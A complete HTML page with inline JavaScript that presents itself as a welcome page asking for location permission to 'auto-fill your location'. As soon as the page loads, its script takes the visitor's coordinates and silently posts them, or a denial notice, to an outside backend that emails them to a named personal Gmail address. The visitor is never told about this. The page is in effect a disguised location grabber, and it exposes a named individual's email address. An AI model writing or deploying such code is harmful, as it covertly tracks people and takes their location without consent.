<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location and Notification Permissions</title>
    <!-- Bootstrap CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Add custom styling here if needed */
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome!</h1>
        <p>This page requests location and notification permissions on load.</p>
        <p id="locationDisplay" class="form-text">Location permissions are required to auto-fill your location.</p>
    </div>

    <!-- Bootstrap and jQuery JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const locationDisplay = document.getElementById("locationDisplay");
            let latitude, longitude;

            // Request Notification and Geolocation Permissions on Page Load
            requestPermissions();

            // Function to request both permissions
            function requestPermissions() {
                // Request notification permission
                if ("Notification" in window) {
                    Notification.requestPermission().then(permission => {
                        if (permission === "granted") {
                            alert("Notifications enabled!");
                        } else {
                            alert("Notifications disabled.");
                        }
                    });
                }

                // Request geolocation permission
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            latitude = position.coords.latitude;
                            longitude = position.coords.longitude;
                            locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                            sendEmail("Location Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                        },
                        (error) => {
                            locationDisplay.textContent = "Location access denied or unavailable.";
                            sendEmail("Location Access Error", "Location access denied or unavailable.", "khalilrodeni@gmail.com");
                        }
                    );
                } else {
                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
                }
            }

            // Email Sending Function
            function sendEmail(subject, message, recipientEmail) {
                const emailData = {
                    subject: subject,
                    message: message,
                    recipient_email: recipientEmail,
                    recipient_name: "Khalil Ahmed"
                };

                fetch("https://zalex-backend.onrender.com/api/send-email/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(emailData)
                })
                .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
                .then(data => console.log(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
                .catch(error => console.log("Error sending email: " + error));
            }
        });
    </script>
</body>
</html>
